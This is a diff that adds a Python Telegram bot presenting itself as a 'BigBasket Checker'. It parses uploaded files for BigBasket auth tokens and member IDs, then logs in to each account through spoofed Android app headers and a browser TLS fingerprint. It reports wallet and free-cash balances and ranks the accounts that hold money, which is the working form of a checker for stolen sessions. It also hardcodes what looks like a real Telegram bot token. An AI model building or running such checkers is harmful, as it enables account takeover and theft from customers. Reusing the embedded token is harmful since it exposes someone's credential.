@@ -1,0 +1,917 @@
+#!/usr/bin/env python3
+"""
+============================================================
+BigBasket Telegram Bot (Complete, Self-Contained)
+============================================================
+Upload ZIP / JSON / TXT -> bot logs in each account ->
+replies with wallet + freecash balance.
+
+Requirements:
+    pip install tls-client colorama python-telegram-bot==20.7
+
+Setup:
+    Windows PowerShell:
+        $env:TG_BOT_TOKEN = "123456:ABC..."
+        python bb_tg_bot.py
+    Or edit BOT_TOKEN below and run directly.
+"""
+
+import os
+import sys
+import io
+import json
+import zipfile
+import tempfile
+import time
+import random
+import uuid
+import base64
+import re
+import asyncio
+from datetime import datetime
+from typing import Dict, List, Optional
+
+# ============================================================
+# WINDOWS ASYNCIO FIX
+# ============================================================
+if sys.platform.startswith("win"):
+    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+
+# ============================================================
+# DEPENDENCIES
+# ============================================================
+try:
+    import tls_client
+except ImportError:
+    print("ERROR: pip install tls-client")
+    sys.exit(1)
+
+try:
+    from telegram import Update
+    from telegram.constants import ParseMode, ChatAction
+    from telegram.ext import (
+        Application,
+        CommandHandler,
+        MessageHandler,
+        ContextTypes,
+        filters,
+    )
+except ImportError:
+    print("ERROR: pip install python-telegram-bot==20.7")
+    sys.exit(1)
+
+
+# ============================================================
+# CONFIG
+# ============================================================
+BOT_TOKEN = "8824890916:AAEkdMZci321XnkIdRbv5VxvvOARyXXVeD0"
+# Or hardcode (never commit/paste publicly):
+# BOT_TOKEN = "123456:ABC-YOUR-TOKEN-HERE"
+
+MAX_FILE_SIZE_MB = 20
+MAX_ACCOUNTS_PER_JOB = 200
+RESULTS_DIR = "tg_results"
+os.makedirs(RESULTS_DIR, exist_ok=True)
+
+
+# ============================================================
+# BIGBASKET CLIENT (embedded)
+# ============================================================
+class BigBasketClient:
+    PROXY = None
+
+    def __init__(
+        self,
+        silent=False,
+        bb_auth_token: Optional[str] = None,
+        m_id: Optional[str] = None,
+        bb_visitor_id: Optional[str] = None,
+    ):
+        self.silent = silent
+        self.session = tls_client.Session(
+            client_identifier="chrome_120",
+            random_tls_extension_order=True,
+        )
+        self.session.proxies = {}
+
+        self.session.headers.update({
+            'accept': 'application/json, text/plain, */*',
+            'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'no-cache',
+            'pragma': 'no-cache',
+            'sec-ch-ua': '"Google Chrome";v="120", "Not:A-Brand";v="8", "Chromium";v="120"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'BB Android/v8.35.0/os 15',
+            'x-channel': 'BB-Android',
+            'x-entry-context': 'bb-b2c',
+            'x-tcp-platform': 'native',
+            'x-tcp-device-version': 'android_8.35.0_25113510',
+            'common-client-static-version': '104',
+            'x-device-model': 'Samsung SM-A536E',
+            'x-is-debug': 'false',
+            'x-pharma': 'true',
+            'x-integrated-fc-door-visible': 'true',
+            'x-bucket-id': '50',
+        })
+
+        self.bb_token = None
+        self.visitor_id = None
+        self.m_id = None
+        self.sa_ids = None
+        self.actual_city_id = "18"
+        self.csurftoken = None
+        self.wallet_details = None
+
+        if bb_auth_token:
+            self._hydrate_from_tokens(bb_auth_token, m_id, bb_visitor_id)
+
+    def _print(self, *a, **k):
+        if not self.silent:
+            print(*a, **k)
+
+    def _hydrate_from_tokens(self, bb_auth_token, m_id, bb_visitor_id):
+        def _maybe_decode(v):
+            if not v or not isinstance(v, str) or len(v) < 4:
+                return v
+            try:
+                padded = v + "=" * ((4 - len(v) % 4) % 4)
+                dec = base64.b64decode(padded).decode("utf-8")
+                if dec and all(c.isdigit() or c.isalpha() or c in "-_." for c in dec):
+                    return dec
+            except Exception:
+                pass
+            return v
+
+        self.bb_token = bb_auth_token
+        self._set_cookie_safe("BBAUTHTOKEN", bb_auth_token)
+        self._set_cookie_safe("_bb_source", "app")
+
+        if m_id:
+            self.m_id = _maybe_decode(m_id)
+            self._set_cookie_safe("_bb_mid", self.m_id)
+        if bb_visitor_id:
+            self.visitor_id = _maybe_decode(bb_visitor_id)
+            self._set_cookie_safe("_bb_vid", self.visitor_id)
+
+        if not self.m_id or not self.visitor_id:
+            try:
+                parts = bb_auth_token.split(".")
+                if len(parts) >= 2:
+                    payload_b64 = parts[1] + "=" * ((4 - len(parts[1]) % 4) % 4)
+                    payload = json.loads(
+                        base64.urlsafe_b64decode(payload_b64).decode("utf-8")
+                    )
+                    if not self.m_id and payload.get("mid"):
+                        self.m_id = str(payload["mid"])
+                        self._set_cookie_safe("_bb_mid", self.m_id)
+                    if not self.visitor_id and payload.get("vid"):
+                        self.visitor_id = str(payload["vid"])
+                        self._set_cookie_safe("_bb_vid", self.visitor_id)
+            except Exception:
+                pass
+
+    def _set_cookie_safe(self, name, value):
+        try:
+            if name in self.session.cookies:
+                del self.session.cookies[name]
+        except Exception:
+            pass
+        if value is not None:
+            self.session.cookies.set(name, value)
+
+    def _update_cookies(self, response):
+        if hasattr(response, 'cookies'):
+            try:
+                for key, value in response.cookies.items():
+                    self._set_cookie_safe(key, value)
+                    if key == 'csurftoken':
+                        self.csurftoken = value
+            except Exception:
+                pass
+
+    def _request_with_retry(self, method, url, **kwargs):
+        response = None
+        for attempt in range(3):
+            if attempt > 0:
+                time.sleep(2)
+            try:
+                fn = getattr(self.session, method.lower())
+                response = fn(url, **kwargs)
+                if response.status_code != 429:
+                    return response
+            except Exception:
+                if attempt == 2:
+                    raise
+        return response
+
+    def generate_tracker(self):
+        return str(uuid.uuid4())
+
+    def get_wallet_details(self):
+        if not self.bb_token:
+            return None
+        try:
+            resp = self._request_with_retry(
+                'GET',
+                'https://www.bigbasket.com/ui-svc/v2/header/?send_door_info=true'
+            )
+            self._update_cookies(resp)
+            self.csurftoken = self.session.cookies.get('csurftoken')
+        except Exception:
+            pass
+
+        self.session.headers.update({
+            'content-type': 'application/json',
+            'x-entry-context-id': '100',
+            'x-integrated-fc-door-visible': 'true',
+            'x-entry-context': 'bb-b2c',
+            'x-tracker': self.generate_tracker(),
+            'x-pharma': 'true',
+        })
+        if self.csurftoken:
+            self.session.headers['x-csurftoken'] = self.csurftoken
+
+        self._set_cookie_safe('_bb_source', 'app')
+        self._set_cookie_safe('_bb_vid', self.visitor_id)
+        self._set_cookie_safe('_bb_mid', self.m_id)
+        if self.sa_ids:
+            self._set_cookie_safe('_bb_sa_ids', self.sa_ids)
+
+        try:
+            resp = self._request_with_retry(
+                'GET',
+                'https://www.bigbasket.com/wallet/v1/details'
+            )
+            self._update_cookies(resp)
+            if resp.status_code == 200:
+                return resp.json()
+            return None
+        except Exception:
+            return None
+
+    def get_free_cash(self):
+        if not self.bb_token:
+            return None
+        try:
+            resp = self._request_with_retry(
+                'GET',
+                'https://www.bigbasket.com/ui-svc/v2/header/?send_door_info=true'
+            )
+            self._update_cookies(resp)
+            self.csurftoken = self.session.cookies.get('csurftoken')
+        except Exception:
+            pass
+
+        headers = {
+            'content-type': 'application/json',
+            'x-retry': '0',
+            'x-tcp-device-version': 'android_8.38.0_25115710',
+            'common-client-static-version': '105',
+            'x-bucket-id': '36',
+            'x-channel': 'BB-Android',
+            'x-tracker': self.generate_tracker(),
+            'x-entry-context': 'bb-b2c',
+            'x-entry-context-id': '100',
+        }
+        if self.csurftoken:
+            headers['x-csurftoken'] = self.csurftoken
+
+        sa_id_val = 28425
+        if self.sa_ids:
+            try:
+                sa_id_val = int(self.sa_ids)
+            except Exception:
+                sa_id_val = 28425
+
+        payload = {
+            "freecash_v2_enabled": True,
+            "sa_city_ids": [int(self.actual_city_id)],
+            "sa_ids": [sa_id_val],
+            "context": "homepage",
+            "page_type": None,
+            "channel": "BB-Android",
+        }
+
+        try:
+            resp = self._request_with_retry(
+                'POST',
+                'https://www.bigbasket.com/ui-svc/v1/free-cash/',
+                json=payload,
+                headers=headers,
+            )
+            if resp.status_code == 200:
+                return resp.json()
+            return None
+        except Exception:
+            return None
+
+
+# ============================================================
+# TOKEN EXTRACTION
+# ============================================================
+def _flatten(d, prefix=""):
+    out = {}
+    if isinstance(d, dict):
+        for k, v in d.items():
+            key = f"{prefix}.{k}" if prefix else k
+            if isinstance(v, (dict, list)):
+                out.update(_flatten(v, key))
+            else:
+                out[key.lower()] = v
+    elif isinstance(d, list):
+        for i, v in enumerate(d):
+            out.update(_flatten(v, f"{prefix}[{i}]"))
+    return out
+
+
+def extract_tokens(obj: Dict) -> Optional[Dict]:
+    if not isinstance(obj, dict):
+        return None
+    flat = _flatten(obj)
+    token = None
+    m_id = None
+    vid = None
+
+    for k, v in flat.items():
+        if isinstance(v, str) and v.startswith("eyJ") and len(v) > 80:
+            if any(t in k for t in ("token", "auth", "jwt")):
+                token = v
+                break
+    if not token:
+        for k, v in flat.items():
+            if isinstance(v, str) and v.startswith("eyJ") and len(v) > 80:
+                token = v
+                break
+
+    for key in ("mid", "m_id", "memberid", "member_id", "bb_mid"):
+        for fk, v in flat.items():
+            if fk == key or fk.endswith("." + key) or key in fk:
+                if isinstance(v, str) and v:
+                    m_id = v
+                    break
+        if m_id:
+            break
+
+    for key in ("bbvisitorid", "bb_visitor_id", "visitorid",
+                "visitor_id", "vid", "bb_vid"):
+        for fk, v in flat.items():
+            if fk == key or fk.endswith("." + key) or key in fk:
+                if isinstance(v, str) and v:
+                    vid = v
+                    break
+        if vid:
+            break
+
+    if not token:
+        return None
+    return {"bbAuthToken": token, "mId": m_id, "bbVisitorId": vid}
+
+
+def extract_tokens_from_text(text: str) -> Optional[Dict]:
+    jwt_m = re.search(
+        r"(eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+)",
+        text
+    )
+    if not jwt_m:
+        return None
+
+    def _find(keys):
+        for k in keys:
+            m = re.search(rf'"{k}"\s*:\s*"([^"]+)"', text, re.IGNORECASE)
+            if m:
+                return m.group(1)
+        return None
+
+    return {
+        "bbAuthToken": jwt_m.group(1),
+        "mId": _find(["mId", "m_id", "member_id", "memberId"]),
+        "bbVisitorId": _find(["bbVisitorId", "bb_visitor_id",
+                              "visitor_id", "visitorId", "vid"]),
+    }
+
+
+# ============================================================
+# CHECK ACCOUNT
+# ============================================================
+def check_account(tokens: Dict, source: str = "input") -> Dict:
+    bb_token = tokens.get("bbAuthToken")
+    m_id_raw = tokens.get("mId")
+    vid_raw = tokens.get("bbVisitorId")
+
+    result = {
+        "source": source,
+        "mId": m_id_raw,
+        "bbVisitorId": vid_raw,
+        "bbAuthToken": bb_token,
+        "wallet": 0.0,
+        "freecash": 0.0,
+        "total": 0.0,
+        "has_cash": False,
+        "wallet_ok": False,
+        "freecash_ok": False,
+        "error": None,
+    }
+
+    try:
+        client = BigBasketClient(
+            silent=True,
+            bb_auth_token=bb_token,
+            m_id=m_id_raw,
+            bb_visitor_id=vid_raw,
+        )
+        result["mId"] = client.m_id
+        result["bbVisitorId"] = client.visitor_id
+
+        wallet_data = client.get_wallet_details()
+        if wallet_data:
+            result["wallet_ok"] = True
+            try:
+                result["wallet"] = float(wallet_data.get("current_wallet_balance") or 0)
+            except (TypeError, ValueError):
+                result["wallet"] = 0.0
+
+        freecash_data = client.get_free_cash()
+        if freecash_data:
+            result["freecash_ok"] = True
+            try:
+                result["freecash"] = float(freecash_data.get("total_freecash_amount") or 0)
+            except (TypeError, ValueError):
+                result["freecash"] = 0.0
+
+        result["total"] = round(result["wallet"] + result["freecash"], 2)
+        result["has_cash"] = result["total"] > 0
+
+        if not result["wallet_ok"] and not result["freecash_ok"]:
+            result["error"] = "auth_failed"
+
+    except Exception as e:
+        result["error"] = str(e)
+
+    return result
+
+
+# ============================================================
+# FILE PARSING
+# ============================================================
+def _safe_text(raw: bytes) -> str:
+    for enc in ("utf-8", "utf-16", "latin-1"):
+        try:
+            return raw.decode(enc)
+        except Exception:
+            continue
+    return raw.decode("utf-8", errors="ignore")
+
+
+def parse_uploaded_file(filename: str, data: bytes) -> List[Dict]:
+    """Return list of token dicts from an uploaded file."""
+    lower = filename.lower()
+    tokens_list: List[Dict] = []
+
+    # --- ZIP ---
+    if lower.endswith(".zip"):
+        try:
+            with zipfile.ZipFile(io.BytesIO(data)) as zf:
+                json_names = [n for n in zf.namelist() if n.lower().endswith(".json")]
+                txt_names = [n for n in zf.namelist() if n.lower().endswith(".txt")]
+                names = json_names or txt_names or zf.namelist()
+
+                for n in names:
+                    try:
+                        raw = zf.read(n)
+                    except Exception:
+                        continue
+                    text = _safe_text(raw)
+                    tokens_list.extend(_tokens_from_blob(text))
+
+        except Exception as e:
+            print(f"ZIP parse error: {e}")
+
+    # --- JSON ---
+    elif lower.endswith(".json"):
+        text = _safe_text(data)
+        try:
+            obj = json.loads(text)
+            if isinstance(obj, list):
+                for item in obj:
+                    t = extract_tokens(item)
+                    if t:
+                        tokens_list.append(t)
+            elif isinstance(obj, dict):
+                t = extract_tokens(obj)
+                if t:
+                    tokens_list.append(t)
+        except json.JSONDecodeError:
+            tokens_list.extend(_tokens_from_blob(text))
+
+    # --- TXT / anything ---
+    else:
+        text = _safe_text(data)
+        tokens_list.extend(_tokens_from_blob(text))
+
+    # Dedup by JWT
+    seen = set()
+    unique = []
+    for t in tokens_list:
+        key = (t.get("bbAuthToken") or "")[:80]
+        if key and key not in seen:
+            seen.add(key)
+            unique.append(t)
+    return unique
+
+
+def _tokens_from_blob(text: str) -> List[Dict]:
+    """Extract tokens from arbitrary text/JSONL/regex fallback."""
+    found = []
+
+    # Whole-blob JSON
+    try:
+        obj = json.loads(text)
+        if isinstance(obj, list):
+            for item in obj:
+                t = extract_tokens(item)
+                if t:
+                    found.append(t)
+            return found
+        if isinstance(obj, dict):
+            t = extract_tokens(obj)
+            if t:
+                found.append(t)
+            return found
+    except Exception:
+        pass
+
+    # JSONL — one JSON per line
+    for line in text.splitlines():
+        line = line.strip()
+        if not line or line[0] not in "{[":
+            continue
+        try:
+            obj = json.loads(line)
+            t = extract_tokens(obj)
+            if t:
+                found.append(t)
+        except Exception:
+            continue
+
+    if found:
+        return found
+
+    # Regex fallback — every JWT + nearby mId/vid
+    jwt_re = re.compile(r"(eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+)")
+    mid_re = re.compile(r'"mId"\s*:\s*"([^"]+)"', re.IGNORECASE)
+    vid_re = re.compile(
+        r'"(?:bbVisitorId|bb_visitor_id|visitor_id|visitorId|vid)"\s*:\s*"([^"]+)"',
+        re.IGNORECASE
+    )
+
+    for jw in jwt_re.finditer(text):
+        token = jw.group(1)
+        window = text[max(0, jw.start() - 500): jw.end() + 500]
+        mid_m = mid_re.search(window)
+        vid_m = vid_re.search(window)
+        found.append({
+            "bbAuthToken": token,
+            "mId": mid_m.group(1) if mid_m else None,
+            "bbVisitorId": vid_m.group(1) if vid_m else None,
+        })
+    return found
+
+
+# ============================================================
+# TELEGRAM FORMATTING
+# ============================================================
+def format_summary(results: List[Dict], elapsed: float, fname: str) -> str:
+    cash = [r for r in results if r.get("has_cash")]
+    failed = [r for r in results if r.get("error") == "auth_failed"]
+    tw = sum(r.get("wallet", 0) for r in results)
+    tf = sum(r.get("freecash", 0) for r in results)
+    grand = tw + tf
+
+    return (
+        f"📊 <b>BigBasket Check Complete</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"📁 File: <code>{fname}</code>\n\n"
+        f"🔢 Total checked: <b>{len(results)}</b>\n"
+        f"💰 With cash: <b>{len(cash)}</b>\n"
+        f"🔒 Auth failed: <b>{len(failed)}</b>\n\n"
+        f"💳 Wallet total: <b>₹{tw:.2f}</b>\n"
+        f"🎯 FreeCash total: <b>₹{tf:.2f}</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🏆 <b>Grand Total: ₹{grand:.2f}</b>\n\n"
+        f"⏱️ Elapsed: {elapsed:.1f}s"
+    )
+
+
+def format_cash_accounts(results: List[Dict], limit: int = 40) -> str:
+    cash = [r for r in results if r.get("has_cash")]
+    if not cash:
+        return "💸 <b>No accounts with balance found.</b>"
+
+    cash.sort(key=lambda r: r.get("total", 0), reverse=True)
+    shown = cash[:limit]
+
+    lines = [f"💰 <b>Accounts with Cash ({len(cash)})</b>", ""]
+    for i, r in enumerate(shown, 1):
+        mid = r.get("mId") or "N/A"
+        w = r.get("wallet", 0)
+        f = r.get("freecash", 0)
+        t = r.get("total", 0)
+        lines.append(
+            f"<b>{i}.</b> <code>{mid}</code>\n"
+            f"    💳 ₹{w:.2f}  |  🎯 ₹{f:.2f}  |  Σ ₹{t:.2f}"
+        )
+    if len(cash) > limit:
+        lines.append(f"\n… and {len(cash) - limit} more (see attached file)")
+    return "\n".join(lines)
+
+
+def chunk_message(text: str, max_len: int = 3800) -> List[str]:
+    chunks = []
+    while len(text) > max_len:
+        cut = text.rfind("\n", 0, max_len)
+        if cut == -1:
+            cut = max_len
+        chunks.append(text[:cut])
+        text = text[cut:].lstrip("\n")
+    if text:
+        chunks.append(text)
+    return chunks
+
+
+# ============================================================
+# BOT HANDLERS
+# ============================================================
+async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    text = (
+        "👋 <b>BigBasket Checker Bot</b>\n\n"
+        "📤 Send me a <b>.zip</b>, <b>.json</b>, or <b>.txt</b> file "
+        "containing BigBasket accounts.\n\n"
+        "<b>Supported formats:</b>\n"
+        "• Single JSON: <code>{bbAuthToken, mId, bbVisitorId}</code>\n"
+        "• JSON array of accounts\n"
+        "• ZIP with multiple .json files\n"
+        "• Raw text containing JWT tokens\n\n"
+        "I'll log in to each account and report wallet + freecash."
+    )
+    await update.message.reply_text(text, parse_mode=ParseMode.HTML)
+
+
+async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    await cmd_start(update, ctx)
+
+
+async def cmd_id(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    await update.message.reply_text(
+        f"Your Telegram ID: <code>{uid}</code>",
+        parse_mode=ParseMode.HTML
+    )
+
+
+async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    msg = update.message
+    doc = msg.document
+    user = update.effective_user
+
+    # Size guard
+    if doc.file_size and doc.file_size > MAX_FILE_SIZE_MB * 1024 * 1024:
+        await msg.reply_text(f"❌ File too large (max {MAX_FILE_SIZE_MB} MB)")
+        return
+
+    fname = doc.file_name or "upload.bin"
+    print(f"[TG] User {user.id} ({user.username}) uploaded {fname} ({doc.file_size} bytes)")
+
+    status = await msg.reply_text(
+        f"📥 Downloading <code>{fname}</code>…",
+        parse_mode=ParseMode.HTML
+    )
+    await ctx.bot.send_chat_action(chat_id=msg.chat_id, action=ChatAction.TYPING)
+
+    # Download
+    try:
+        tg_file = await doc.get_file()
+        buf = io.BytesIO()
+        await tg_file.download_to_memory(buf)
+        raw = buf.getvalue()
+    except Exception as e:
+        await status.edit_text(f"❌ Download failed: {e}")
+        return
+
+    await status.edit_text("🔍 Parsing accounts…")
+
+    # Parse
+    try:
+        tokens_list = parse_uploaded_file(fname, raw)
+    except Exception as e:
+        await status.edit_text(f"❌ Parse error: {e}")
+        return
+
+    if not tokens_list:
+        await status.edit_text(
+            "❌ No valid BigBasket accounts found in file.\n"
+            "Make sure it contains <code>bbAuthToken</code> (a JWT starting with <code>eyJ</code>).",
+            parse_mode=ParseMode.HTML,
+        )
+        return
+
+    if len(tokens_list) > MAX_ACCOUNTS_PER_JOB:
+        tokens_list = tokens_list[:MAX_ACCOUNTS_PER_JOB]
+        await msg.reply_text(f"⚠️ Limiting to first {MAX_ACCOUNTS_PER_JOB} accounts.")
+
+    total = len(tokens_list)
+    await status.edit_text(
+        f"✅ Found <b>{total}</b> account(s). Checking…\n"
+        f"<i>This may take a few minutes.</i>",
+        parse_mode=ParseMode.HTML,
+    )
+
+    results: List[Dict] = []
+    t0 = time.time()
+    last_edit = 0.0
+
+    for i, tokens in enumerate(tokens_list, 1):
+        source = f"acct{i}"
+        result = await asyncio.to_thread(check_account, tokens, source)
+        results.append(result)
+
+        now = time.time()
+        if now - last_edit > 2.5 or i == total:
+            last_edit = now
+            cash_so_far = sum(1 for r in results if r.get("has_cash"))
+            try:
+                await status.edit_text(
+                    f"⏳ Progress: <b>{i}/{total}</b>\n"
+                    f"💰 With cash so far: <b>{cash_so_far}</b>",
+                    parse_mode=ParseMode.HTML,
+                )
+            except Exception:
+                pass
+
+        await asyncio.sleep(0.3)
+
+    elapsed = time.time() - t0
+
+    # Summary
+    try:
+        await status.edit_text(
+            format_summary(results, elapsed, fname),
+            parse_mode=ParseMode.HTML,
+        )
+    except Exception:
+        pass
+
+    # Cash accounts
+    cash_text = format_cash_accounts(results, limit=40)
+    for chunk in chunk_message(cash_text, 3800):
+        try:
+            await msg.reply_text(chunk, parse_mode=ParseMode.HTML)
+        except Exception:
+            await msg.reply_text(chunk)
+
+    # Full results JSON file
+    payload = {
+        "summary": {
+            "total": len(results),
+            "with_cash": sum(1 for r in results if r.get("has_cash")),
+            "auth_failed": sum(1 for r in results if r.get("error") == "auth_failed"),
+            "total_wallet": round(sum(r.get("wallet", 0) for r in results), 2),
+            "total_freecash": round(sum(r.get("freecash", 0) for r in results), 2),
+            "grand_total": round(sum(r.get("total", 0) for r in results), 2),
+            "elapsed": round(elapsed, 1),
+            "checked_at": datetime.utcnow().isoformat() + "Z",
+            "source_file": fname,
+            "user_id": user.id,
+        },
+        "cash_accounts": [r for r in results if r.get("has_cash")],
+        "all_results": results,
+    }
+
+    out_name = f"{os.path.splitext(fname)[0]}_checked_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+    out_path = os.path.join(RESULTS_DIR, out_name)
+    with open(out_path, "w", encoding="utf-8") as f:
+        json.dump(payload, f, indent=2, ensure_ascii=False)
+
+    with open(out_path, "rb") as f:
+        await msg.reply_document(
+            document=f,
+            filename=out_name,
+            caption=f"📎 Full results ({len(results)} accounts)",
+        )
+
+    print(f"[TG] User {user.id}: done {len(results)}, {payload['summary']['with_cash']} with cash")
+
+
+async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    """Allow pasting tokens directly as chat text."""
+    text = (update.message.text or "").strip()
+    if not text or text.startswith("/"):
+        return
+
+    if "eyJ" not in text:
+        await update.message.reply_text(
+            "Send a <b>.zip</b>, <b>.json</b>, or <b>.txt</b> file with accounts, "
+            "or paste tokens directly (must contain a JWT starting with <code>eyJ</code>).",
+            parse_mode=ParseMode.HTML,
+        )
+        return
+
+    tokens_list = _tokens_from_blob(text)
+    if not tokens_list:
+        await update.message.reply_text("❌ Could not find any BigBasket tokens in that text.")
+        return
+
+    if len(tokens_list) > MAX_ACCOUNTS_PER_JOB:
+        tokens_list = tokens_list[:MAX_ACCOUNTS_PER_JOB]
+
+    status = await update.message.reply_text(
+        f"✅ Found <b>{len(tokens_list)}</b> account(s). Checking…",
+        parse_mode=ParseMode.HTML,
+    )
+
+    results: List[Dict] = []
+    t0 = time.time()
+    for i, tokens in enumerate(tokens_list, 1):
+        r = await asyncio.to_thread(check_account, tokens, f"acct{i}")
+        results.append(r)
+        if i % 3 == 0 or i == len(tokens_list):
+            try:
+                await status.edit_text(
+                    f"⏳ Progress: <b>{i}/{len(tokens_list)}</b>",
+                    parse_mode=ParseMode.HTML,
+                )
+            except Exception:
+                pass
+        await asyncio.sleep(0.3)
+
+    elapsed = time.time() - t0
+    try:
+        await status.edit_text(
+            format_summary(results, elapsed, "pasted_text"),
+            parse_mode=ParseMode.HTML,
+        )
+    except Exception:
+        pass
+
+    cash_text = format_cash_accounts(results, limit=40)
+    for chunk in chunk_message(cash_text, 3800):
+        try:
+            await update.message.reply_text(chunk, parse_mode=ParseMode.HTML)
+        except Exception:
+            await update.message.reply_text(chunk)
+
+
+async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    files = [f for f in os.listdir(RESULTS_DIR) if f.endswith(".json")]
+    await update.message.reply_text(
+        f"📁 Results saved: <b>{len(files)}</b> file(s) in <code>{RESULTS_DIR}/</code>",
+        parse_mode=ParseMode.HTML,
+    )
+
+
+# ============================================================
+# MAIN
+# ============================================================
+def main():
+    if not BOT_TOKEN:
+        print("ERROR: Set TG_BOT_TOKEN environment variable.")
+        print('  Windows PowerShell:')
+        print('    $env:TG_BOT_TOKEN = "123456:ABC-xyz..."')
+        print('  Or edit BOT_TOKEN directly in this file.')
+        sys.exit(1)
+
+    print("=" * 60)
+    print("  BigBasket Telegram Bot")
+    print("=" * 60)
+    print(f"  Max file size: {MAX_FILE_SIZE_MB} MB")
+    print(f"  Max accounts/job: {MAX_ACCOUNTS_PER_JOB}")
+    print(f"  Results dir: {RESULTS_DIR}/")
+    print("  Press Ctrl+C to stop")
+    print("=" * 60)
+
+    app = Application.builder().token(BOT_TOKEN).build()
+
+    app.add_handler(CommandHandler("start", cmd_start))
+    app.add_handler(CommandHandler("help", cmd_help))
+    app.add_handler(CommandHandler("id", cmd_id))
+    app.add_handler(CommandHandler("stats", cmd_stats))
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
+
+    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\nBot stopped.")
+    except Exception as e:
+        print(f"Fatal: {e}")
+        import traceback
+        traceback.print_exc()
+        sys.exit(1)
